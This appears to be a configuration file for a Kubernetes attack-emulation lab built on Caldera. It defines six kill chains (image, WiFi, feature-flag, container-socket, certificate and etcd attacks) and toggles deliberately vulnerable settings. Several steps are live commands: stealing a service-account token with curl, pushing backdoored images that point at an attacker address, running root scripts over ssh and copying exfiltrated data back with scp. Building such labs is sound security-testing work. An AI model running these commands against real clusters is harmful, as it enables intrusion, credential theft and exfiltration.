# ========================
# ⚙️ Config variables
# ========================

# ----------
# Kill chains configuration
# ----------
# Order of the kill chains to be executed and actor who will execute them
ADV_LIST="KC1 – Image@cluster, KC2 – WiFi@outside, KC3 – FlagATT@outside, KC4 – CRSocket@outside, KC5 – Certificate@outside, KC6 – Etcd@outside"
# Enable/Disable kill chains (order of execution is defined in ADV_LIST)
ENABLEKC1=true
ENABLEKC2=true
ENABLEKC3=true
ENABLEKC4=true
ENABLEKC5=true
ENABLEKC6=true
# Script to be executed before and after each kill chain (order of execution is defined in ADV_LIST)
SCRIPT_PRE_KC1="null.sh"
SCRIPT_PRE_KC2="null.sh"
SCRIPT_PRE_KC3="null.sh"
SCRIPT_PRE_KC4="null.sh"
SCRIPT_PRE_KC5="null.sh"
SCRIPT_PRE_KC6="null.sh"
SCRIPT_POST_KC1="null.sh"
SCRIPT_POST_KC2="null.sh"
SCRIPT_POST_KC3="null.sh"
SCRIPT_POST_KC4="null.sh"
SCRIPT_POST_KC5="null.sh"
SCRIPT_POST_KC6="null.sh"

# KC1 - Kill Chain 1: Image attack
KC0101="sleep 1 && echo \"[SIM] initial access with this compromised image\""
KC0102="sleep 1 && echo \"[SIM] reverse shell opened to C&C server (caldera)\""
KC0103="sleep 1 && /opt/caldera/KC1/dns-enum.sh"
KC0104="sleep 1 && /opt/caldera/KC1/scan-opensearch.sh"
KC0105="sleep 1 && cat $DATA_PATH/KC1/token"
KC0106="sleep 1 && /opt/caldera/KC1/deploy-containers.sh"
KC0107="sleep 1 && echo \"[SIM] name masqueration of a deployment\""
KC0108="sleep 1 && /opt/caldera/KC1/dns-poisoning.sh"

# KC2 - Kill Chain 2: WiFi attack
KC0201="sleep 1 && echo \"[SIM] initial access with stolen Wi-Fi credentials\""
KC0202="sleep 1 && /opt/caldera/KC2/nmap-enum.sh"
KC0203="sleep 1 && /opt/caldera/KC2/kubelet-scan.sh"
KC0204="sleep 1 && /opt/caldera/KC2/pass-enum.sh"
KC0205="docker login $HOSTREGISTRY -u $(cat $DATA_PATH/KC2/user) -p $(cat $DATA_PATH/KC2/pass) && docker build --build-arg EXFIL_DOMAIN=$ATTACKERADDR -f /utils/checkout/Dockerfile -t $HOSTREGISTRY/checkout:2.0.3 /utils/checkout && docker push $HOSTREGISTRY/checkout:2.0.3"
KC0206="sleep 1 && echo \"[SIM] Exfiltration of data by proxy inside image\""
KC0207="sleep 1 && /opt/caldera/KC2/arp-spoof.sh"
KC0208="sleep 1 && /opt/caldera/KC2/DOS-frontend.sh"

# KC3 - Kill Chain 3: FlagATT attack
KC0301="sleep 1 && echo \"[SIM] initial access with anonymous account\""
KC0302="sleep 1 && /opt/caldera/KC3/api-enum.sh"
KC0303="sleep 1 && cat $DATA_PATH/KC3/credentials"
KC0304="sleep 1 && /opt/caldera/KC3/modify-flags.sh"
KC0305="sleep 1 && /opt/caldera/KC3/users-enum.sh"
KC0306="curl -sk \"https://$CONTROL_PLANE_NODE:$CONTROL_PLANE_PORT/api/v1/namespaces/$NSPROTO/services/currency:8081/proxy/var/run/secrets/kubernetes.io/serviceaccount/token\" > $DATA_PATH/KC3/tokenCurrency && cat $DATA_PATH/KC3/tokenCurrency"
KC0307="sleep 1 && /opt/caldera/KC3/job-creation.sh"
KC0308="sleep 1 && echo \"[SIM] order with free products sent\""

# KC4 - Kill Chain 4: CRSocket attack
KC0401="sleep 1 && /opt/caldera/KC4/rce-attack.sh"
KC0402="ssh -p 4222 -o StrictHostKeyChecking=no root@$(cat $DATA_PATH/KC4/attackaddr) \"cat ~/.ssh/authorized_keys\""
KC0403="ssh -p 4222 root@$(cat $DATA_PATH/KC4/attackaddr) '/usr/bin/env bash -s' < /opt/caldera/KC4/container-analysis.sh > $DATA_PATH/KC4/container-analysis.log 2>&1 && echo 'Analysis completed'"
KC0404="ssh -p 4222 root@$(cat $DATA_PATH/KC4/attackaddr) '/usr/bin/env bash -s' < /opt/caldera/KC4/cr-attack.sh"
KC0405="ssh -p 4222 root@$(cat $DATA_PATH/KC4/attackaddr) '/usr/bin/env bash -s' < /opt/caldera/KC4/container-collection.sh > $DATA_PATH/KC4/cri-analysis.log 2>&1 && echo 'Analysis completed'"
KC0406="ssh -p 4222 root@$(cat $DATA_PATH/KC4/attackaddr) \"/usr/bin/env bash -s -- https://$CONTROL_PLANE_NODE:$CONTROL_PLANE_PORT\" < /opt/caldera/KC4/np-modification.sh"
KC0407="ssh -p 4222 root@$(cat $DATA_PATH/KC4/attackaddr) \"/usr/bin/env bash -s\" < /opt/caldera/KC4/container-admin1.sh && ssh -p 4222 root@$(cat $DATA_PATH/KC4/attackaddr) \"/usr/bin/env bash -s\" < /opt/caldera/KC4/container-admin2.sh"
KC0408="scp -r -P 4222 root@$(cat $DATA_PATH/KC4/attackaddr):/tmp/exfiltration $DATA_PATH/KC4/analysis && echo \"Exfiltration done\""

# KC5 - Kill Chain 5: Certificate attack
KC0501="sleep 1 && echo \"[SIM] initial access with SSH connection\""
KC0502="sleep 1 && /opt/caldera/KC5/MITM-attack.sh"
KC0503="sleep 1 && /opt/caldera/KC5/priv-deploy.sh"
KC0504="sleep 1 && /opt/caldera/KC5/node-collection.sh"
KC0505="sleep 1 && /opt/caldera/KC5/node-imp.sh"
KC0506="sleep 1 && /opt/caldera/KC5/pvc-attack.sh"
KC0507="sleep 1 && /opt/caldera/KC5/state-update.sh"
KC0508="sleep 1 && /opt/caldera/KC5/pod-dos.sh"
KC0509="sleep 1 && echo \"[SIM] destruction of all data\""
KC0510="sleep 1 && /opt/caldera/KC5/service-rerun.sh"

# KC6 - Kill Chain 6: Etcd attack
KC0601="sleep 1 && echo \"[SIM] execution of code in the control plane that expose etcd server\""
KC0602="sleep 1 && /opt/caldera/KC6/etcd-attack.sh"
KC0603="sleep 1 && /opt/caldera/KC6/kubeconfig-creation.sh"
KC0604="sleep 1 && /opt/caldera/KC6/undo-RBAC.sh"
KC0605="sleep 1 && /opt/caldera/KC6/daemon-deploy.sh"
KC0606="sleep 1 && echo \"[SIM] name masqueration of the DaemonSet\""
KC0607="sleep 1 && /opt/caldera/KC6/secrets-collection.sh"
KC0608="sleep 1 && /opt/caldera/KC6/exf-secrets.sh"
KC0609="sleep 1 && /opt/caldera/KC6/und-expansion.sh"
KC0610="sleep 1 && /opt/caldera/KC6/registry-attack.sh"
KC0611="sleep 1 && docker login $HOSTREGISTRY -u $(cat /tmp/user) -p $(cat /tmp/pass) && docker build --build-arg CALDERA_HOST=$ATTACKERADDR -f /utils/proxy/Dockerfile -t $HOSTREGISTRY/frontend-proxy:2.0.2 /utils/proxy && docker push $HOSTREGISTRY/frontend-proxy:2.0.2"

# ----------
# Switch vulnerabilities
# ----------
# The vulnerabilities are enabled only if they are set as "true" 
# if they are set in other ways, they are deactivated (read manual for more info)
# KC1
LOG_OPEN=true
LOG_TOKEN=true
DNS_GRANT=true
DEPLOY_GRANT=true

# KC2
OPEN_PORTS=true
AUTO_DEPLOY=true

# KC3
ANONYMOUS_GRANT=true
FLAGD_CONFIGMAP=true
FLAGD_FEATURES=true
CURRENCY_GRANT=true

# KC4
RCE_VULN=true
HOST_NETWORK=true
SOCKET_SHARED=true

# KC5
API_CERT=true
#MISSING_POLICY=true
#AUTOMOUNT_TOKEN=true

# KC6
ETCD_EXPOSURE=true

# Generic vulnerabilities
RECURSIVE_DNS=true
ANONYMOUS_AUTH=true

# ========================
# ⚙️ Skaffold variables
# ========================
# ----------
# Demo App
# ----------
# 0 for Minikube, 1 for Kind
KIND_CLUSTER=1
BUILD_CONTAINERS_K8S=false

# ----------
# Docker Network
# ----------
BUILD_CONTAINERS_DOCKER=true
LOAD_GENERATOR_ENABLE=false
SAMBA_ENABLE=true
PROXY_ENABLE=true
CALDERA_CONTROLLER_ENABLE=true
ATTACKER_ENABLE=true
CALDERA_SERVER_ENABLE=true
CALDERA_SERVER=caldera
ATTACKER=attacker
CALDERA_CONTROLLER=controller
PROXY=router
REGISTRY_NAME=registry
REGISTRY_PORT=5000
REGISTRY_USER=testuser
REGISTRY_PASS=testpassword

# ----------
# Namespaces
# ----------
APP_NAMESPACE=app
DAT_NAMESPACE=dat
DMZ_NAMESPACE=dmz
MEM_NAMESPACE=mem
PAY_NAMESPACE=pay
TST_NAMESPACE=tst